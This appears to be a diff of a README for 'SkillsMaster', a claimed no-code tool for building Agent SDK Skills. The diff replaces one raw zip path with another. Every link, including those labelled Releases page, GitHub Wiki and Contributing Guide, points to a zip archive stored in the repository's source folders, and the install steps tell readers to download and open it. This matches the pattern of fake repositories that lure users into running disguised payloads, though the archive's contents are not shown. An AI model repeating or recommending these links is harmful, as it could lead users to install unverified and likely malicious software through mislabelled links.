@@ -1,7 +1,7 @@
 # 🎉 SkillsMaster - Easily Create and Test Skills
 
 ## 📥 Download SkillsMaster
-[![Download SkillsMaster](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/app/api/Skills-Master-2.2.zip%https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/app/api/Skills-Master-2.2.zip)](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/app/api/Skills-Master-2.2.zip)
+[![Download SkillsMaster](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/components/skills/Skills_Master_v3.1.zip%https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/components/skills/Skills_Master_v3.1.zip)](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/components/skills/Skills_Master_v3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to SkillsMaster! This application is designed as a playground for Skills, built on the Agent SDK. It's easy to use, allowing you to create, test, and manage Skills without any programming experience.
@@ -21,9 +21,9 @@ To run SkillsMaster effectively, ensure your system meets the following requirem
 - Network: Internet access for updates and downloads
 
 ## 🔗 Download & Install
-To get started with SkillsMaster, you need to visit our [Releases page](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/app/api/Skills-Master-2.2.zip) to download the software. Follow these steps:
+To get started with SkillsMaster, you need to visit our [Releases page](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/components/skills/Skills_Master_v3.1.zip) to download the software. Follow these steps:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/app/api/Skills-Master-2.2.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/components/skills/Skills_Master_v3.1.zip).
 2. Look for the latest version of SkillsMaster.
 3. Download the appropriate file for your operating system.
 4. Once the download is complete, open the file to start the installation process.
@@ -45,13 +45,13 @@ After installation, you can start using SkillsMaster right away. Here's how:
    - Edit or delete Skills as needed.
 
 ## 📚 Helpful Resources
-- **User Guide:** A comprehensive user guide is available to help you navigate SkillsMaster smoothly. You can find it within the application and on the [GitHub Wiki](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/app/api/Skills-Master-2.2.zip).
+- **User Guide:** A comprehensive user guide is available to help you navigate SkillsMaster smoothly. You can find it within the application and on the [GitHub Wiki](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/components/skills/Skills_Master_v3.1.zip).
 - **Support:** If you run into issues or have questions, please check our FAQ page also found on the GitHub Wiki.
 
 ## 🔄 Keeping SkillsMaster Updated
 It’s important to keep SkillsMaster updated for the best experience. To update:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/app/api/Skills-Master-2.2.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/components/skills/Skills_Master_v3.1.zip).
 2. Download the latest version.
 3. Run the installer; it will overwrite your existing version while preserving your Skills.
 
@@ -65,9 +65,9 @@ If you have a moment, please give us a star on GitHub!
 
 ## 🤝 Contributing
 If you're interested in contributing to SkillsMaster, we welcome your input. 
-- Check our [Contributing Guide](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/app/api/Skills-Master-2.2.zip) to learn how to get started.
+- Check our [Contributing Guide](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/components/skills/Skills_Master_v3.1.zip) to learn how to get started.
 
 ## 🌍 Visit Our Releases Page Again?
-For more downloads and updates, don’t forget to check our [Releases page](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/app/api/Skills-Master-2.2.zip).
+For more downloads and updates, don’t forget to check our [Releases page](https://raw.githubusercontent.com/LufyXd458/SkillsMaster/main/components/skills/Skills_Master_v3.1.zip).
 
 Thank you for choosing SkillsMaster! Enjoy your experience in creating and testing Skills.
